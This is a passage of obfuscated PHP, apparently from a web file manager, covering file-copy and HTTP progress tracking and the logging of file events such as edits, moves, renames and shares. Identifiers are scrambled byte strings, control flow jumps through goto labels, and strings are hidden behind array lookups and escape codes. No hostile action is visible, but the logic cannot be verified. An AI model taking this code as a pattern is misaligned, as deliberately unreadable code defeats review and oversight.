$D—„Ë†”î[$dÌÖÛÜ‘Ã[1619]][$dÌÖÛÜ‘Ã[1620]] : 0; $D—„Ë†”î[$dÌÖÛÜ‘Ã[1619]] = array($dÌÖÛÜ‘Ã[1620] => $fµã‹Ï¬²‰ + 1, $dÌÖÛÜ‘Ã[415] => $bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[28]], $dÌÖÛÜ‘Ã[76] => $bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[76]], $dÌÖÛÜ‘Ã[513] => $bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[513]] ? $bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[513]] : $bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[76]]); goto bÕÕ’š¼¬; dÅ†Œ×ï±ç: $dÌÖÛÜ‘Ã =& $_SERVER[›é¼±]; if (!$DÂë¯ÉßÀñ) { return; } $D—„Ë†”î =& $this->task; goto Aò×‘Áâ—¼; C†ù…°Ôóù: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($DÇîÙ¸ÔÈÁ) { $E‹¨Œ²Èó„ =& $_SERVER[›é¼±]; $dŒ¹‚ƒ·¾“ =& $this->task; $dŒ¹‚ƒ·¾“[$E‹¨Œ²Èó„[1608]] = $DÇîÙ¸ÔÈÁ[$E‹¨Œ²Èó„[28]]; $dŒ¹‚ƒ·¾“[$E‹¨Œ²Èó„[1057]] = $DÇîÙ¸ÔÈÁ[$E‹¨Œ²Èó„[28]]; $this->update(); } public function copyFileStart($BªñóÀÚŒ, $dó¶ò‹ö«¾, $eï“«Êª‹ø, $aÜ©—æ¨‰, $CÔè—Æ˜Êš, $DÌÈ©é‹†ğ) { goto BÚÇ’íî·Ï; dƒ¼„§§¢ö: $this->update(0, $EÇØÒä‹ßè); goto d××¼”»ùÁ; BÚÇ’íî·Ï: $Fî‰áæ‹¶Ã =& $_SERVER[›é¼±]; $añ³Ã…÷ˆ = $CÔè—Æ˜Êš; if ($añ³Ã…÷ˆ == $GLOBALS[$Fî‰áæ‹¶Ã[1621]]) { $añ³Ã…÷ˆ = $GLOBALS[$Fî‰áæ‹¶Ã[1622]]; } goto B‡·Ï–¢Á; FõÛ‚¸ˆ»í: $EÇØÒä‹ßè = $e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[1610]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[395]] . $Fî‰áæ‹¶Ã[1623]); if ($EÇØÒä‹ßè && file_exists(get_path_father($aÜ©—æ¨‰))) { Cache::set($e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[395]] . $Fî‰áæ‹¶Ã[1623], $aÜ©—æ¨‰); $e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[1583]] = array($Fî‰áæ‹¶Ã[1624], $Fî‰áæ‹¶Ã[1625]); } goto dƒ¼„§§¢ö; B¯·†Ÿƒ‘×: $e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[1057]] = $Fî‰áæ‹¶Ã[33]; $e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[1612]] = $Fî‰áæ‹¶Ã[33]; $e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[1613]] = 0; goto FõÛ‚¸ˆ»í; a–í½¿¼: $e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[1608]] = $añ³Ã…÷ˆ; $e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[1610]] = (int) $BªñóÀÚŒ->size($dó¶ò‹ö«¾); $e½²§–ÙÄ¹[$Fî‰áæ‹¶Ã[1611]] = 0; goto B¯·†Ÿƒ‘×; B‡·Ï–¢Á: $GLOBALS[$Fî‰áæ‹¶Ã[1622]] = $CÔè—Æ˜Êš; $GLOBALS[$Fî‰áæ‹¶Ã[1621]] = $DÌÈ©é‹†ğ; $e½²§–ÙÄ¹ =& $this->task; goto a–í½¿¼; d××¼”»ùÁ: } public static function updateCopyLocalFileSize($D“ÅÑ§¥¿) { goto béÓëÚÏïÀ; B²£ÊÎñÇ•: $D“ÅÑ§¥¿[$BÚ¾•äŞ„[1611]] = @filesize($bôò¬±¤´³); $D“ÅÑ§¥¿[$BÚ¾•äŞ„[1615]] += $D“ÅÑ§¥¿[$BÚ¾•äŞ„[1611]]; self::updateTask($D“ÅÑ§¥¿); goto a‡¼ËÁäå‰; béÓëÚÏïÀ: $BÚ¾•äŞ„ =& $_SERVER[›é¼±]; $bôò¬±¤´³ = Cache::get($D“ÅÑ§¥¿[$BÚ¾•äŞ„[395]] . $BÚ¾•äŞ„[1623]); if (!$bôò¬±¤´³ || !file_exists($bôò¬±¤´³)) { return $D“ÅÑ§¥¿; } goto B²£ÊÎñÇ•; a‡¼ËÁäå‰: return $D“ÅÑ§¥¿; goto Bõæ–Ù‡; Bõæ–Ù‡: } public function copyFileEnd($B ÷˜”—Ë·, $D»öÂÆœ¥ß, $EÍÂğ°Ôê˜, $Dø¸‚Éèä, $Aä´÷‘¿ƒ, $e·¨Şæ¶İ) { goto b…âƒÉ¢³×; b…âƒÉ¢³×: $Eâ‡…Æ”Á’ =& $_SERVER[›é¼±]; $A‚Äˆº³Š® =& $this->task; $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1611]] = $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1610]]; goto FôÒôâ¡¥Š; FôÒôâ¡¥Š: $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1612]] = $Eâ‡…Æ”Á’[33]; unset($A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1583]]); if ($Aä´÷‘¿ƒ == $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1608]]) { $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1614]] += $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1610]]; $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1615]] = $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1614]]; $this->update(1); } else { $this->update(); $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1611]] = 0; } goto e„ß£ƒ¥½¥; e„ß£ƒ¥½¥: Cache::remove($A‚Äˆº³Š®[$Eâ‡…Æ”Á’[395]] . $Eâ‡…Æ”Á’[1623]); self::log($Eâ‡…Æ”Á’[1626] . $D»öÂÆœ¥ß . $Eâ‡…Æ”Á’[67] . $Dø¸‚Éèä . $Eâ‡…Æ”Á’[229] . $Aä´÷‘¿ƒ . $Eâ‡…Æ”Á’[1627] . $A‚Äˆº³Š®[$Eâ‡…Æ”Á’[1608]]); goto bĞË‘æÃ‡¥; bĞË‘æÃ‡¥: } public function updateFileEnd($e¥Ì¹„©µŠ, $fÈ¿²‚İ¯î) { goto Bºèã‰ª½“; B‡æ†Ú«¸: $c´ÃÜßè’×[$aš–Ú°„’Ş[1610]] = $fÈ¿²‚İ¯î; $c´ÃÜßè’×[$aš–Ú°„’Ş[1614]] += $fÈ¿²‚İ¯î; $c´ÃÜßè’×[$aš–Ú°„’Ş[1615]] = $c´ÃÜßè’×[$aš–Ú°„’Ş[1614]]; goto d´É÷¦Ü‰Ñ; Bºèã‰ª½“: $aš–Ú°„’Ş =& $_SERVER[›é¼±]; $c´ÃÜßè’× =& $this->task; $c´ÃÜßè’×[$aš–Ú°„’Ş[1608]] = $e¥Ì¹„©µŠ; goto B‡æ†Ú«¸; d´É÷¦Ü‰Ñ: $this->update(1); self::log($aš–Ú°„’Ş[1628] . $e¥Ì¹„©µŠ); goto CßŸ‚Û¯†; CßŸ‚Û¯†: } public function sourceModelCopy($eÁ›”‘ÉÚ) { goto F³Ï¢¬è‘‹; aø÷Íâ¤¡: switch ($C¿Õ¡‘Ô¡å) { case $fÚ„Íò°ùº[560]: $DÄëŒèóß• = 1; break; case $fÚ„Íò°ùº[563]: $E‚ÙÆ§‘ªé[$fÚ„Íò°ùº[1608]] = $Fó‰‘÷Â[$fÚ„Íò°ùº[28]]; break; case $fÚ„Íò°ùº[565]: $DÄëŒèóß• = intval($eÁ›”‘ÉÚ[$fÚ„Íò°ùº[378]] * 0.4); break; case $fÚ„Íò°ùº[567]: $DÄëŒèóß• = intval($eÁ›”‘ÉÚ[$fÚ„Íò°ùº[378]] * 0.2); break; case $fÚ„Íò°ùº[569]: $DÄëŒèóß• = intval($eÁ›”‘ÉÚ[$fÚ„Íò°ùº[378]] * 0.4); break; } $this->update($DÄëŒèóß•); $this->sourceModelCopyFlag = !1; goto fà‹Ìè‘†¾; f¾õ¸ùÈ¼£: $E‚ÙÆ§‘ªé =& $this->task; $this->sourceModelCopyFlag = !0; $DÄëŒèóß• = 0; goto aø÷Íâ¤¡; F³Ï¢¬è‘‹: $fÚ„Íò°ùº =& $_SERVER[›é¼±]; $C¿Õ¡‘Ô¡å = $eÁ›”‘ÉÚ[0]; $Fó‰‘÷Â = $eÁ›”‘ÉÚ[1]; goto f¾õ¸ùÈ¼£; fà‹Ìè‘†¾: } public function sourceRemove($b„™·‰á, $c›¢œçÕ‡î) { $e¼ê¤·¨ =& $_SERVER[›é¼±]; $this->sourceModelCopyFlag = !0; $F¯¦øî“…Â = 1; if (isset($b„™·‰á[$e¼ê¤·¨[81]])) { $F¯¦øî“…Â = $b„™·‰á[$e¼ê¤·¨[81]][$e¼ê¤·¨[79]] + $b„™·‰á[$e¼ê¤·¨[81]][$e¼ê¤·¨[80]] + 1; } $this->update($F¯¦øî“…Â); $this->sourceModelCopyFlag = !1; } public function sourceMove($Fƒ¢Ñ°ø›†) { $this->sourceRemove($Fƒ¢Ñ°ø›†, !1); } public function curlProgress($f“öÔ¾É«„, $DÒŞÚ‹Ş, $eËïÕáã¢Ÿ, $f¬ŞŒƒ–ãº, $dµ¦½ÁˆÖ¹) { $A‹’ÇØöëê =& $_SERVER[›é¼±]; $CÃ²·ğğàñ =& $this->task; if ($dµ¦½ÁˆÖ¹ > 0) { $CÃ²·ğğàñ[$A‹’ÇØöëê[1057]] = $A‹’ÇØöëê[1629]; $CÃ²·ğğàñ[$A‹’ÇØöëê[1612]] = $A‹’ÇØöëê[107]; if ($CÃ²·ğğàñ[$A‹’ÇØöëê[1610]]) { $CÃ²·ğğàñ[$A‹’ÇØöëê[1611]] = $dµ¦½ÁˆÖ¹; } if ($CÃ²·ğğàñ[$A‹’ÇØöëê[1613]]) { $CÃ²·ğğàñ[$A‹’ÇØöëê[1611]] = $dµ¦½ÁˆÖ¹ + $CÃ²·ğğàñ[$A‹’ÇØöëê[1613]]; } } else { if ($eËïÕáã¢Ÿ > 0) { if ($CÃ²·ğğàñ[$A‹’ÇØöëê[1610]] == $DÒŞÚ‹Ş) { $CÃ²·ğğàñ[$A‹’ÇØöëê[1611]] = $eËïÕáã¢Ÿ; $CÃ²·ğğàñ[$A‹’ÇØöëê[1057]] = $A‹’ÇØöëê[1630]; $CÃ²·ğğàñ[$A‹’ÇØöëê[1612]] = $A‹’ÇØöëê[1127]; } } } $this->update(); } public function curlProgressStart($fïëßŒ¸’õ) { } public function curlProgressEnd($fİˆ™‘¯) { goto f…Š”„¥ˆ‰; FÌ¯æà˜İ: $e¾ëÌ¨Âñ = $A‚âäë¥†Ô[$B‰’íÑŞ®×[1631]]; if ($e¾ëÌ¨Âñ == -1) { $e¾ëÌ¨Âñ = $A‚âäë¥†Ô[$B‰’íÑŞ®×[1632]]; } if ($A™ˆÃÕóêÜ[$B‰’íÑŞ®×[1612]] == $B‰’íÑŞ®×[107] && $e¾ëÌ¨Âñ) { $A™ˆÃÕóêÜ[$B‰’íÑŞ®×[1613]] += $e¾ëÌ¨Âñ; } goto FÆØäÔÂ™Š; f…Š”„¥ˆ‰: $B‰’íÑŞ®× =& $_SERVER[›é¼±]; $A™ˆÃÕóêÜ =& $this->task; $A‚âäë¥†Ô = curl_getinfo($fİˆ™‘¯); goto FÌ¯æà˜İ; FÆØäÔÂ™Š: $this->update(); goto c­Ê¥»ù¢…; c­Ê¥»ù¢…: } } class TaskHttp extends Task { protected function startAfter() { $F–£¾¶Şã =& $_SERVER[›é¼±]; $F¯˜à¦½‰• =& $this->task; $F¯˜à¦½‰•[$F–£¾¶Şã[1633]] = 1; Hook::bind($F–£¾¶Şã[1602], array($this, $F–£¾¶Şã[1634])); Hook::bind($F–£¾¶Şã[1604], array($this, $F–£¾¶Şã[1635])); Hook::bind($F–£¾¶Şã[1606], array($this, $F–£¾¶Şã[1636])); } protected function endAfter() { $E½ óÎ›¢ô =& $_SERVER[›é¼±]; Hook::unbind($E½ óÎ›¢ô[1602], array($this, $E½ óÎ›¢ô[1634])); Hook::unbind($E½ óÎ›¢ô[1604], array($this, $E½ óÎ›¢ô[1635])); Hook::unbind($E½ óÎ›¢ô[1606], array($this, $E½ óÎ›¢ô[1636])); } public function progressStart($eå‹Ïöå·‚) { $f©ñõØ“‚­ =& $_SERVER[›é¼±]; $Dø–á±ñ÷ = curl_getinfo($eå‹Ïöå·‚); self::log($f©ñõØ“‚­[1637] . $Dø–á±ñ÷[$f©ñõØ“‚­[305]]); self::valueSet($this->task[$f©ñõØ“‚­[395]], $this->task); } public function progressEnd($aöè“ó½æ¯) { $Bá®÷ÅŒ§÷ =& $_SERVER[›é¼±]; self::log($Bá®÷ÅŒ§÷[1638] . $this->task[$Bá®÷ÅŒ§÷[395]]); $this->end(); } public function progress($A§»¦Ùèºã, $CÎ—ˆß›‘¹, $DÑ›ôÈ½Ó¿, $eÛ’ê¦Š”ô, $DìÒˆˆÎ‡) { $D‹ï•–•Ü¹ =& $_SERVER[›é¼±]; $eŒÁç¢»® =& $this->task; if ($DìÒˆˆÎ‡ > 0) { $eŒÁç¢»®[$D‹ï•–•Ü¹[1055]] = $eŒÁç¢»®[$D‹ï•–•Ü¹[1055]] == 0 ? $eÛ’ê¦Š”ô : $eŒÁç¢»®[$D‹ï•–•Ü¹[1055]]; $eŒÁç¢»®[$D‹ï•–•Ü¹[1069]] = $DìÒˆˆÎ‡; } else { if ($DÑ›ôÈ½Ó¿ > 0) { $eŒÁç¢»®[$D‹ï•–•Ü¹[1055]] = $eŒÁç¢»®[$D‹ï•–•Ü¹[1055]] == 0 ? $CÎ—ˆß›‘¹ : $eŒÁç¢»®[$D‹ï•–•Ü¹[1055]]; $eŒÁç¢»®[$D‹ï•–•Ü¹[1069]] = $DÑ›ôÈ½Ó¿; } } $this->update(); self::log("\160\x72\x6f\147\162\145\163\163\110\164\164\160\x3a\144\157\167\156\72{$DÑ›ôÈ½Ó¿}\57{$CÎ—ˆß›‘¹}\73\x20\165\160\x6c\x6f\x61\144\x3a{$DìÒˆˆÎ‡}\x2f{$eÛ’ê¦Š”ô}\73"); } } goto C‹ß¥¨´²; c×Â÷Ë¢±º: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\x63\x65\x5f\145\166\145\x6e\x74"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\x54\151\x6d\145", "\x74\x69\155\x65", "\151\156\163\145\162\164", "\146\x75\156\143\164\x69\x6f\x6e"), array("\x64\145\163\x63", '', "\x69\x6e\163\145\162\x74\54\165\160\x64\x61\164\145\54\163\x65\x6c\x65\143\x74", "\x6a\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($B¯×ÜŸã¥, $BÀ¶‚‘Á·, $bÆÓÙ Îª± = '') { goto AÂ†‰Ù‘ƒ•; cÇ´¤×—˜: return $this->add($d’º›µá‡); goto BÂ¿½Ïí¢ï; EõÉ‹é›Òù: if (!$BÙ…´ğ‘¨•) { return !1; } if ($this->isCacheEvent($BÙ…´ğ‘¨•, $BÀ¶‚‘Á·)) { return; } if ($bÆÓÙ Îª± && is_string($bÆÓÙ Îª±)) { $bÆÓÙ Îª± = array($C·ó¨¤ˆ©Š[1771] => $bÆÓÙ Îª±); } goto AØÍÚŒ‰…; AØÍÚŒ‰…: $d’º›µá‡ = array($C·ó¨¤ˆ©Š[412] => $B¯×ÜŸã¥, $C·ó¨¤ˆ©Š[1944] => $BÙ…´ğ‘¨•[$C·ó¨¤ˆ©Š[492]], $C·ó¨¤ˆ©Š[1945] => $BÙ…´ğ‘¨•[$C·ó¨¤ˆ©Š[28]], $C·ó¨¤ˆ©Š[513] => !empty($BÙ…´ğ‘¨•[$C·ó¨¤ˆ©Š[513]]) ? $BÙ…´ğ‘¨•[$C·ó¨¤ˆ©Š[513]] : $C·ó¨¤ˆ©Š[33], $C·ó¨¤ˆ©Š[1555] => USER_ID, $C·ó¨¤ˆ©Š[417] => $BÀ¶‚‘Á·, $C·ó¨¤ˆ©Š[1557] => $bÆÓÙ Îª±); $this->addSystemLog($BÀ¶‚‘Á·, $d’º›µá‡); unset($d’º›µá‡[$C·ó¨¤ˆ©Š[1945]], $d’º›µá‡[$C·ó¨¤ˆ©Š[513]]); goto cÇ´¤×—˜; AÂ†‰Ù‘ƒ•: $C·ó¨¤ˆ©Š =& $_SERVER[›é¼±]; if (!$this->eventSave) { return; } $BÙ…´ğ‘¨• = Model($C·ó¨¤ˆ©Š[1239])->sourceInfo($B¯×ÜŸã¥); goto EõÉ‹é›Òù; BÂ¿½Ïí¢ï: } private function addSystemLog($f·Ú¨æòŞë, $bäí–“È÷) { $BæÎ¬ÌÚâã =& $_SERVER[›é¼±]; if ($f·Ú¨æòŞë == $BæÎ¬ÌÚâã[1946]) { $f·Ú¨æòŞë = $bäí–“È÷[$BæÎ¬ÌÚâã[445]][$BæÎ¬ÌÚâã[1947]]; } else { if (in_array($f·Ú¨æòŞë, array($BæÎ¬ÌÚâã[1710], $BæÎ¬ÌÚâã[1948]))) { $f·Ú¨æòŞë = $bäí–“È÷[$BæÎ¬ÌÚâã[445]][$BæÎ¬ÌÚâã[750]]; } } $fÑÁ¡åÂµÙ = array_merge($bäí–“È÷, array($BæÎ¬ÌÚâã[1949] => $bäí–“È÷[$BæÎ¬ÌÚâã[397]], $BæÎ¬ÌÚâã[1950] => $bäí–“È÷[$BæÎ¬ÌÚâã[1950]])); Model($BæÎ¬ÌÚâã[1674])->addLog($BæÎ¬ÌÚâã[1951] . $f·Ú¨æòŞë, $fÑÁ¡åÂµÙ); } private function isCacheEvent($eéÆÇÊéŞ›, $aê£–ò„õ¬) { if ($eéÆÇÊéŞ›[$_SERVER[›é¼±][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($AÑ±ÆÙùš, $C«ÎØµŒÕå) { $fÀØŸ ÉÊô =& $_SERVER[›é¼±]; $Dƒ­ˆ­íö = Model($fÀØŸ ÉÊô[1239])->sourceInfo($AÑ±ÆÙùš); $bôå”Å×™ = array($fÀØŸ ÉÊô[1947] => $C«ÎØµŒÕå, $fÀØŸ ÉÊô[28] => $Dƒ­ˆ­íö[$fÀØŸ ÉÊô[28]]); return $this->addEvent($AÑ±ÆÙùš, $fÀØŸ ÉÊô[1946], $bôå”Å×™); } public function eventFileEdit($E«–Œ’©ó) { $A‡èöÊ¢´’ =& $_SERVER[›é¼±]; $FãÏ¢¸ÇİÏ = array($A‡èöÊ¢´’[1952] => $_SERVER[$A‡èöÊ¢´’[1953]], $A‡èöÊ¢´’[1954] => strtolower(ACTION)); return $this->addEvent($E«–Œ’©ó, $A‡èöÊ¢´’[1700], $FãÏ¢¸ÇİÏ); } public function eventRecycle($CÄÏËÒ–Í¯, $cÄºì¯Ã„) { return $this->addEvent($CÄÏËÒ–Í¯, $_SERVER[›é¼±][1948], $cÄºì¯Ã„); } public function eventRemove($FÕ¯â‡Óš) { $b•¥áéÈ‘± =& $_SERVER[›é¼±]; $c½Š‰ÃÌ´Ã = Model($b•¥áéÈ‘±[1239])->sourceInfo($FÕ¯â‡Óš); $eÇ—Šõ‡õ« = $c½Š‰ÃÌ´Ã[$b•¥áéÈ‘±[28]]; return $this->addEvent($c½Š‰ÃÌ´Ã[$b•¥áéÈ‘±[492]], $b•¥áéÈ‘±[1699], $eÇ—Šõ‡õ«); } public function eventShare($aÖÑÛ÷ËŠ, $eŠ†ƒî‘õ–) { return $this->addEvent($aÖÑÛ÷ËŠ, $_SERVER[›é¼±][1710], $eŠ†ƒî‘õ–); } public function eventMove($dö¼Ã‹Û, $a¥©Ûó¬”½, $AÅšåé¢––) { goto bë³Û®–¥‰; bë³Û®–¥‰: $F’×›Òİ‡™ =& $_SERVER[›é¼±]; $A‘È«³«© = Model($F’×›Òİ‡™[1239]); $EÔõó´É›ì = $A‘È«³«©->sourceInfo($dö¼Ã‹Û); goto b–ÂÔæ¼ÁÌ; Bï­»¿·ˆÑ: $this->addEvent($dö¼Ã‹Û, $F’×›Òİ‡™[545], $c¨”ÛÀ¦¸); $EÔõó´É›ì = $A‘È«³«©->sourceInfo($dö¼Ã‹Û); $c¨”ÛÀ¦¸ = array($F’×›Òİ‡™[397] => $EÔõó´É›ì[$F’×›Òİ‡™[397]], $F’×›Òİ‡™[28] => $EÔõó´É›ì[$F’×›Òİ‡™[28]]); goto bÚÅÆŒøÍò; bÚÅÆŒøÍò: $this->addEvent($a¥©Ûó¬”½, $F’×›Òİ‡™[1958], $c¨”ÛÀ¦¸); goto fîë¶²»ƒ ; b–ÂÔæ¼ÁÌ: $e÷¢¡Ü²… = $A‘È«³«©->sourceInfo($a¥©Ûó¬”½); $b Ã‡•¾Ü‘ = $A‘È«³«©->sourceInfo($AÅšåé¢––); $c¨”ÛÀ¦¸ = array($F’×›Òİ‡™[1088] => $a¥©Ûó¬”½, $F’×›Òİ‡™[1955] => $e÷¢¡Ü²…[$F’×›Òİ‡™[28]], $F’×›Òİ‡™[1935] => !empty($e÷¢¡Ü²…[$F’×›Òİ‡™[513]]) ? $e÷¢¡Ü²…[$F’×›Òİ‡™[513]] : $F’×›Òİ‡™[33], $F’×›Òİ‡™[1089] => $AÅšåé¢––, $F’×›Òİ‡™[1956] => $b Ã‡•¾Ü‘[$F’×›Òİ‡™[28]], $F’×›Òİ‡™[1957] => !empty($b Ã‡•¾Ü‘[$F’×›Òİ‡™[513]]) ? $b Ã‡•¾Ü‘[$F’×›Òİ‡™[513]] : $F’×›Òİ‡™[33]); goto Bï­»¿·ˆÑ; fîë¶²»ƒ : } public function eventCopy($a‘ß¨Ì’) { $this->eventCreate($a‘ß¨Ì’, $_SERVER[›é¼±][543]); } public function eventRename($Eäø¡Èµ¹ä, $b™°ª´‹‡², $AÃ‡Úáß) { $CÉê‚ÉÌ® =& $_SERVER[›é¼±]; $Aô«®–¥³– = array($CÉê‚ÉÌ®[1088] => $b™°ª´‹‡², $CÉê‚ÉÌ®[1089] => $AÃ‡Úáß); return $this->addEvent($Eäø¡Èµ¹ä, $CÉê‚ÉÌ®[1253], $Aô«®–¥³–); } public function eventAddComment($bí¬Šô‹Ó, $e¹Œ“¢Ì¼) { return $this->addEvent($bí¬Šô‹Ó, $_SERVER[›é¼±][1959], $e¹Œ“¢Ì¼); } public function eventAddDesc($bñ­ƒ³ÌÙš, $Eè¾â†¨˜í) { return $this->addEvent($bñ­ƒ³ÌÙš, $_SERVER[›é¼±][1960], $Eè¾â†¨˜í); } public function listBySource($B „äÈİà½) { goto e²òÒÆÌ…š; b‘¾²ÄÏ×: return $this->eventListParse($fƒêßõšÕ, $B „äÈİà½); goto a°§¼™„©¿; FçÌÎ‰®˜Ë: if ($bÙ¥……É[$f’äÄ¬äù[405]] == $f’äÄ¬äù[87]) { $a†Ø¥É¨á÷ = Model($f’äÄ¬äù[1239])->listSearchChildren($B „äÈİà½, 20000); $a†Ø¥É¨á÷[] = $B „äÈİà½ . $f’äÄ¬äù[376]; $FåïÑ‚¿ŠÈ = array($f’äÄ¬äù[397] => array($f’äÄ¬äù[7], $a†Ø¥É¨á÷)); } $fƒêßõšÕ = $this->where($FåïÑ‚¿ŠÈ)->order($f’äÄ¬äù[1961])->selectPage(); if ($fƒêßõšÕ[$f’äÄ¬äù[364]][$f’äÄ¬äù[365]] == 0) { $fƒêßõšÕ[$f’äÄ¬äù[364]][$f’äÄ¬äù[365]] = 1; $fƒêßõšÕ[$f’äÄ¬äù[367]] = array(array($f’äÄ¬äù[412] => $B „äÈİà½, $f’äÄ¬äù[1944] => $bÙ¥……É[$f’äÄ¬äù[492]], $f’äÄ¬äù[1555] => $bÙ¥……É[$f’äÄ¬äù[446]], $f’äÄ¬äù[417] => $f’äÄ¬äù[1962], $f’äÄ¬äù[418] => $bÙ¥……É[$f’äÄ¬äù[194]], $f’äÄ¬äù[1557] => $f’äÄ¬äù[33])); } goto b‘¾²ÄÏ×; e²òÒÆÌ…š: $f’äÄ¬äù =& $_SERVER[›é¼±]; $bÙ¥……É = Model($f’äÄ¬äù[1239])->sourceInfo($B „äÈİà½); $FåïÑ‚¿ŠÈ = array($f’äÄ¬äù[412] => $B „äÈİà½); goto FçÌÎ‰®˜Ë; a°§¼™„©¿: } private function eventListParse($D‰Œ»ˆê¤È, $dßóğàõÙñ) { goto fø¼Ùğ‘…; AØŒì½‘Ù­: $f±äï¶œ²‘ = Model($aöğ°ã´©å[827])->sourceListInfo($E¾ï»¥×ƒ, !0); foreach ($c ñµ¤ä™ as &$FİĞïÏ«ç³) { if ($FİĞïÏ«ç³[$aöğ°ã´©å[29]] == $aöğ°ã´©å[545] && isset($FİĞïÏ«ç³[$aöğ°ã´©å[445]][$aöğ°ã´©å[1088]])) { $FİĞïÏ«ç³[$aöğ°ã´©å[445]][$aöğ°ã´©å[1088]] = $f±äï¶œ²‘[$FİĞïÏ«ç³[$aöğ°ã´©å[445]][$aöğ°ã´©å[1088]]]; $FİĞïÏ«ç³[$aöğ°ã´©å[445]][$aöğ°ã´©å[1089]] = $f±äï¶œ²‘[$FİĞïÏ«ç³[$aöğ°ã´©å[445]][$aöğ°ã´©å[1089]]]; } if ($FİĞïÏ«ç³[$aöğ°ã´©å[29]] == $aöğ°ã´©å[1958] && isset($FİĞïÏ«ç³[$aöğ°ã´©å[445]][$aöğ°ã´©å[397]])) { $FİĞïÏ«ç³[$aöğ°ã´©å[445]][$aöğ°ã´©å[397]] = $f±äï¶œ²‘[$FİĞïÏ«ç³[$aöğ°ã´©å[445]][$aöğ°ã´©å[397]]]; } $FİĞïÏ«ç³[$aöğ°ã´©å[85]] = $f±äï¶œ²‘[$FİĞïÏ«ç³[$aöğ°ã´©å[397]]]; $FİĞïÏ«ç³[$aöğ°ã´©å[1963]] = $f±äï¶œ²‘[$FİĞïÏ«ç³[$aöğ°ã´©å[1950]]]; if ($FİĞïÏ«ç³[$aöğ°ã´©å[29]] == $aöğ°ã´©å[1699]) { $FİĞïÏ«ç³[$aöğ°ã´©å[1963]] = $FİĞïÏ«ç³[$aöğ°ã´©å[85]]; $FİĞïÏ«ç³[$aöğ°ã´©å[1950]] = $FİĞïÏ«ç³[$aöğ°ã´©å[1963]][$aöğ°ã´©å[397]]; $FİĞïÏ«ç³[$aöğ°ã´©å[85]] = !1; $FİĞïÏ«ç³[$aöğ°ã´©å[397]] = $aöğ°ã´©å[33]; } $FİĞïÏ«ç³[$aöğ°ã´©å[1895]] = $f‰õè ”ß[$FİĞïÏ«ç³[$aöğ°ã´©å[1564]]]; } unset($FİĞïÏ«ç³); goto Eö˜Şé˜ì; FßÇ·ÛÂ‡ë: $E¾ï»¥×ƒ = array_unique($E¾ï»¥×ƒ); $bÏ–†¨è¶ = array_unique(array_to_keyvalue($c ñµ¤ä™, $aöğ°ã´©å[33], $aöğ°ã´©å[1564])); $f‰õè ”ß = Model($aöğ°ã´©å[532])->userListInfo($bÏ–†¨è¶); goto AØŒì½‘Ù­; Eö˜Şé˜ì: $D‰Œ»ˆê¤È[$aöğ°ã´©å[367]] = $c ñµ¤ä™; return $D‰Œ»ˆê¤È; goto B¦ğ›ÎÔóÚ; aé˜‚ÈÓºØ: $Bàê´ª²½á = array_to_keyvalue($c ñµ¤ä™, $aöğ°ã´©å[33], $aöğ°ã´©å[1950]); foreach ($c ñµ¤ä™ as $FİĞïÏ«ç³) { $c–¯ø²‰ƒ¿ = $FİĞïÏ«ç³[$aöğ°ã´©å[445]]; if ($FİĞïÏ«ç³[$aöğ°ã´©å[29]] == $aöğ°ã´©å[545] && isset($c–¯ø²‰ƒ¿[$aöğ°ã´©å[1088]])) { $E¾ï»¥×ƒ[] = $c–¯ø²‰ƒ¿[$aöğ°ã´©å[1088]] . $aöğ°ã´©å[33]; $E¾ï»¥×ƒ[] = $c–¯ø²‰ƒ¿[$aöğ°ã´©å[1089]] . $aöğ°ã´©å[33]; } if ($FİĞïÏ«ç³[$aöğ°ã´©å[29]] == $aöğ°ã´©å[1958] && isset($c–¯ø²‰ƒ¿[$aöğ°ã´©å[397]])) { $E¾ï»¥×ƒ[] = $c–¯ø²‰ƒ¿[$aöğ°ã´©å[397]] . $aöğ°ã´©å[33]; } } $E¾ï»¥×ƒ = array_merge($E¾ï»¥×ƒ, $Bàê´ª²½á, array($dßóğàõÙñ . $aöğ°ã´©å[33])); goto FßÇ·ÛÂ‡ë; fø¼Ùğ‘…: $aöğ°ã´©å =& $_SERVER[›é¼±]; $c ñµ¤ä™ = $D‰Œ»ˆê¤È[$aöğ°ã´©å[367]]; $E¾ï»¥×ƒ = array_to_keyvalue($c ñµ¤ä™, $aöğ°ã´©å[33], $aöğ°ã´©å[397]); goto aé˜‚ÈÓºØ; B¦ğ›ÎÔóÚ: } public function removeBySource($fí ¸Ñô©) { $B×Å…ê…°ô = array($_SERVER[›é¼±][412] => $fí ¸Ñô©); $this->where($B×Å…ê…°ô)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = 